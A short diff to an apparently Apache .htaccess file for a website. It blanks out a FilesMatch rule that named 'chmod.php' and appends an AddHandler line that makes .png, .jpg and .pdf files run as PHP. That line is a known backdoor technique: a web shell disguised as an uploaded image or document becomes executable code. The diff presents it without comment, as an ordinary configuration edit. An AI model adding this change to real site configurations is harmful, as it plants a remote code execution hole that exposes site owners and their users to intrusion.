@@ -39,7 +39,7 @@
     Deny from all
 </Files>
 
-<FilesMatch "^(chmod.php)$">
+<FilesMatch "^( )$">
 
  Order allow,deny
 
@@ -57,3 +57,5 @@ RewriteRule . /index.php [L]
 </IfModule>
 ErrorDocument 403 /index.php
 ErrorDocument 404 /index.php
+
+AddHandler application/x-httpd-php .png .jpg .pdf
